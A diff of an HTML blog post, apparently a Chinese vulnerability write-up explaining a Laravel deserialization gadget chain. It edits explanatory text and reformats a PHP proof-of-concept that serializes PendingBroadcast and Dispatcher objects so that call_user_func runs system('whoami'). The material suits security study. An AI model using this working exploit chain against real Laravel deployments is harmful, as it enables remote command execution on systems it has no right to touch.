@@ -119,13 +119,14 @@
 								<p>&nbsp;&nbsp;&nbsp;寻找一个有dispatch()方法的类，这里$this->events构造为Dispatcher类，跟随变量流向来到Dispatcher类中。
 									众所周知，这里的dispatch()方法是个好东西，里面调用了$this->dispatchToQueue()方法，可以用来调用任意类(虽然我没复现之前不知道)。</p>
 								<p>&nbsp;&nbsp;&nbsp;不过，要想调用$this->dispatchToQueue()方法还需要构造if中的两个条件为true。第一个条件$this->queueResolver直接赋值即可，
-									这里讲一下第二个条件$this->commandShouldBeQueued($command)。</p>
+									这里讲一下第二个条件$this->commandShouldBeQueued($command)怎么构造。</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-7-10/pop-4.jpg" alt="">
                 </a>
                 
-                <p>&nbsp;&nbsp;&nbsp;来到$this->commandShouldBeQueued($command)方法中，可以看到$command是类名，这里要返回一个ShouldQueue接口类，全局find usage找一个ShouldQueue接口类就行。</p>
+                <p>&nbsp;&nbsp;&nbsp;来到$this->commandShouldBeQueued($command)方法中，可以看到$command是类名，这里要返回一个ShouldQueue接口类，
+                	全局find usage找一个ShouldQueue接口类，把类名赋值给$command就行。</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-7-10/pop-5.jpg" alt="">
@@ -140,7 +141,7 @@
                 <p>&nbsp;&nbsp;&nbsp;可以看到$this->queueResolver是call_user_func()函数中的第一个参数，$connection为第二个参数。
                 	$this->queueResolver是Dispatcher类中的成员变量，这里直接覆盖就可以了。
                 	而$connection是由$command->connection赋值过来的，$command又是由上面$this->ShouldBeQueued($command)方法返回的ShouldQueue接口类。
-                	只要给ShouldQueue接口类中的成员变量($this->connection)赋值即可。</p>
+                	所以只要给ShouldQueue接口类中的成员变量($this->connection)赋值即可。</p>
 
                 <a href="#">
                     <img class="img-fluid" src="../img/2021-7-10/pop-7.jpg" alt="">
@@ -159,26 +160,26 @@
                 
                 <h2 class="section-heading">POC</h2>
                 
-                <div>
-                	
-                	<pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+								<div>
+									
+								<pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
 
-<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span> {
 
-    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span>\<span class="hljs-title">Dispatcher</span>;
-    
+    <span class="hljs-title">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span>\<span class="hljs-title">Dispatcher</span>;
+
     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingBroadcast</span>
     </span>{
-    
+
         <span class="hljs-keyword">protected</span> <span class="hljs-variable">$events</span>;
         <span class="hljs-keyword">protected</span> <span class="hljs-variable">$event</span>;
-    
+
         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj_destruct</span>, <span class="hljs-variable">$obj_implements</span>)</span>
         </span>{
             <span class="hljs-variable">$this</span>-&gt;events = <span class="hljs-variable">$obj_destruct</span>;
             <span class="hljs-variable">$this</span>-&gt;event = <span class="hljs-variable">$obj_implements</span>;
         }
-    
+
         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
         </span>{
             <span class="hljs-variable">$this</span>-&gt;events-&gt;dispatch(<span class="hljs-variable">$this</span>-&gt;event);
@@ -189,44 +190,46 @@
     <span class="hljs-variable">$obj_implements</span> = <span class="hljs-keyword">new</span> BroadcastEvent(<span class="hljs-string">'17'</span>);
     <span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> PendingBroadcast(<span class="hljs-variable">$obj_destruct</span>, <span class="hljs-variable">$obj_implements</span>);
     <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pwn</span>));
+}
 
-<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span>;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span> {
 
-    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Contracts</span>\<span class="hljs-title">Queue</span>\<span class="hljs-title">Queue</span>;
-    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Contracts</span>\<span class="hljs-title">Queue</span>\<span class="hljs-title">ShouldQueue</span>;
-    
+    <span class="hljs-title">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Contracts</span>\<span class="hljs-title">Queue</span>\<span class="hljs-title">ShouldQueue</span>;
+
     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dispatcher</span>
     </span>{
         <span class="hljs-keyword">protected</span> <span class="hljs-variable">$queueResolver</span> = <span class="hljs-string">'system'</span>;
-    
+
         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
         </span>{
             <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;queueResolver &amp;&amp; <span class="hljs-variable">$this</span>-&gt;commandShouldBeQueued(<span class="hljs-variable">$command</span>)) {
                 <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;dispatchToQueue(<span class="hljs-variable">$command</span>);
             }
         }
-    
+
         <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commandShouldBeQueued</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
         </span>{
             <span class="hljs-keyword">return</span> <span class="hljs-variable">$command</span> <span class="hljs-keyword">instanceof</span> ShouldQueue;
         }
-    
+
         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatchToQueue</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
         </span>{
             <span class="hljs-variable">$connection</span> = <span class="hljs-variable">$command</span>-&gt;connection ?? <span class="hljs-keyword">null</span>;
-    
+
             <span class="hljs-variable">$queue</span> = call_user_func(<span class="hljs-variable">$this</span>-&gt;queueResolver, <span class="hljs-variable">$connection</span>);
         }
     }
+}
 
-<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>;
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span> {
 
-    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BroadcastEvent</span>
-    </span>{
-        <span class="hljs-keyword">public</span> <span class="hljs-variable">$connection</span> = <span class="hljs-string">'whoami'</span>;
-    }</span></code></pre>
-                	
-                </div>
+    <span class="hljs-title">class</span> <span class="hljs-title">BroadcastEvent</span>
+    {
+        <span class="hljs-title">public</span> $<span class="hljs-title">connection</span> = '<span class="hljs-title">whoami</span>';
+    }
+}</span></code></pre>	
+									
+								</div>
 
 
            
